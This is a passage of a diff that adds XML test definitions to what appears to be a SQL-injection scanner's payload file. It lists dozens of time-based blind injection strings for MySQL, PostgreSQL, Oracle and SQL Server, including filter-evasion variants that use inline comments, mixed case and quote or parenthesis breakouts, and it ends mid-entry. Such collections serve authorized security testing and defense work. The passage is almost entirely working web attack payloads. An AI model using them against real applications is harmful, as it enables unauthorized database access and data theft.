+        <title>Time-Based Blind - Oracle - 56</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME]) FROM dual) IS NOT NULL--</vector>
+        <request>
+            <payload>' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME]) FROM dual) IS NOT NULL--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 57</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND (SELECT pg_sleep([SLEEPTIME]))--</vector>
+        <request>
+            <payload>' AND (SELECT pg_sleep([SLEEPTIME]))--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 58</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND SlEeP([SLEEPTIME])--</vector>
+        <request>
+            <payload>' AND SlEeP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 59</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>" AND SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>" AND SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 60</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND SLEEP(/**/ [SLEEPTIME])--</vector>
+        <request>
+            <payload>' AND SLEEP(/**/ [SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 61</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' AND SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>' AND SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 62</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>') AND SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>') AND SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 63</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>')) AND SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>')) AND SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 64</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>')); AND SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>')); AND SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 65</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/*!AND*/SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'/*!AND*/SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 66</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/AND/**/SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'/**/AND/**/SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 67</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'AND(SLEEP([SLEEPTIME]))--</vector>
+        <request>
+            <payload>'AND(SLEEP([SLEEPTIME]))--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 68</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' || CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep(0) END--</vector>
+        <request>
+            <payload>' || CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep(0) END--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 69</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>" || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>" || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 70</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>' || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 71</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>') || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>') || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 72</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>')) || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>')) || DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 73</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'||DBMS_PIPE.RECEIVE_MESSAGE('a',[SLEEPTIME])--</vector>
+        <request>
+            <payload>'||DBMS_PIPE.RECEIVE_MESSAGE('a',[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 74</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'; IF (1=1) WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>'; IF (1=1) WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 75</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'; IF (1=1) WAITFOR DELAY '0:0:[SLEEPTIME]'; --</vector>
+        <request>
+            <payload>'; IF (1=1) WAITFOR DELAY '0:0:[SLEEPTIME]'; --</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 76</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'; IF (1=1) WAITFOR DELAY/**/'0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>'; IF (1=1) WAITFOR DELAY/**/'0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 77</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'; IF (2>1) WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>'; IF (2>1) WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Microsoft SQL Server - 78</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'; IF ('a'='a') WAITFOR DELAY '0:0:[SLEEPTIME]'--</vector>
+        <request>
+            <payload>'; IF ('a'='a') WAITFOR DELAY '0:0:[SLEEPTIME]'--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 79</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 80</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/OR/**/1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</vector>
+        <request>
+            <payload>'/**/OR/**/1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 81</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR 1=(SELECT 1 FROM pg_sleep([SLEEPTIME]))--</vector>
+        <request>
+            <payload>' OR 1=(SELECT 1 FROM pg_sleep([SLEEPTIME]))--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 82</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME]) FROM dual)--</vector>
+        <request>
+            <payload>' OR 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME]) FROM dual)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 83</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR (CASE WHEN (1=1) THEN SLEEP([SLEEPTIME]) ELSE 0 END)--</vector>
+        <request>
+            <payload>' OR (CASE WHEN (1=1) THEN SLEEP([SLEEPTIME]) ELSE 0 END)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 84</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>' OR IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 85</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/OR/**/IF(1=1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>'/**/OR/**/IF(1=1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 86</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR IF(2>1,SLEEP([SLEEPTIME]),0)--</vector>
+        <request>
+            <payload>' OR IF(2>1,SLEEP([SLEEPTIME]),0)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 87</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>' OR pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 88</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/OR/**/pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>'/**/OR/**/pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 89</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR PG_SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>' OR PG_SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 90</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR (pg_sleep([SLEEPTIME])) IS NOT NULL--</vector>
+        <request>
+            <payload>' OR (pg_sleep([SLEEPTIME])) IS NOT NULL--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 91</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR (SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</vector>
+        <request>
+            <payload>' OR (SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 92</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/*!OR*/(SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</vector>
+        <request>
+            <payload>'/*!OR*/(SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 93</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/OR/**/(SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</vector>
+        <request>
+            <payload>'/**/OR/**/(SELECT 1 FROM (SELECT SLEEP([SLEEPTIME])) t)--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 94</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR (SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep(0) END) IS NOT NULL--</vector>
+        <request>
+            <payload>' OR (SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep(0) END) IS NOT NULL--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - Oracle - 95</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME]) FROM dual) IS NOT NULL--</vector>
+        <request>
+            <payload>' OR (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),[SLEEPTIME]) FROM dual) IS NOT NULL--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 96</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR (SELECT pg_sleep([SLEEPTIME]))--</vector>
+        <request>
+            <payload>' OR (SELECT pg_sleep([SLEEPTIME]))--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 97</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR (SELECT SLEEP(/**/ [SLEEPTIME]))--</vector>
+        <request>
+            <payload>' OR (SELECT SLEEP(/**/ [SLEEPTIME]))--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 98</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR SlEeP([SLEEPTIME])--</vector>
+        <request>
+            <payload>' OR SlEeP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 99</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>" OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>" OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 100</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR SLEEP(/**/ [SLEEPTIME])--</vector>
+        <request>
+            <payload>' OR SLEEP(/**/ [SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 101</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>' OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 102</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>') OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>') OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 103</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>')) OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>')) OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 104</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/*!OR*/SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'/*!OR*/SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 105</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'/**/OR/**/SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>'/**/OR/**/SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 106</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'OR(SLEEP([SLEEPTIME]))--</vector>
+        <request>
+            <payload>'OR(SLEEP([SLEEPTIME]))--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - MySQL - 107</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>` OR SLEEP([SLEEPTIME])--</vector>
+        <request>
+            <payload>` OR SLEEP([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 108</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>"||pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>"||pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 109</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>' || pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>' || pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 110</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>'' || pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>'' || pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 111</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>') || pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>') || pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+    <test>
+        <title>Time-Based Blind - PostgreSQL - 112</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1,2,3</where>
+        <vector>')) || pg_sleep([SLEEPTIME])--</vector>
+        <request>
+            <payload>')) || pg_sleep([SLEEPTIME])--</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
